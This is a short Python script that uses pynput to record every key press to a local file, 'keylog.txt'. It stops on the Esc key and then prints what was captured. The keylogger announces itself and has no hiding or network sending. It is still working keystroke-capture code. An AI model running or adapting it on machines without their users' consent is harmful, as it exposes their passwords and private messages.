from pynput import keyboard

# Specify the key to stop the program
EXIT_KEY = keyboard.Key.esc
LOG_FILE = "keylog.txt"

def on_press(key):
    """Handles key press events."""
    try:
        # Log alphanumeric keys
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Log special keys like space, enter, etc.
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"[{key}]")

def on_release(key):
    """Stops the keylogger when the EXIT_KEY is pressed."""
    if key == EXIT_KEY:
        print(f"\n'{EXIT_KEY}' pressed. Exiting the program.")
        return False

def display_keystrokes():
    """Reads and prints the logged keystrokes."""
    try:
        with open(LOG_FILE, "r") as log_file:
            keystrokes = log_file.read()
        print("\nLogged Keystrokes:")
        print(keystrokes if keystrokes else "No keystrokes were logged.")
    except FileNotFoundError:
        print("\nNo log file found. No keystrokes were logged.")

if __name__ == "__main__":
    print(f"Keylogger is running. Press '{EXIT_KEY}' to stop...")
    print("Logged keystrokes will be saved to 'keylog.txt'.")
    try:
        # Start listening to keyboard events
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Display the logged keystrokes at the end
        display_keystrokes()

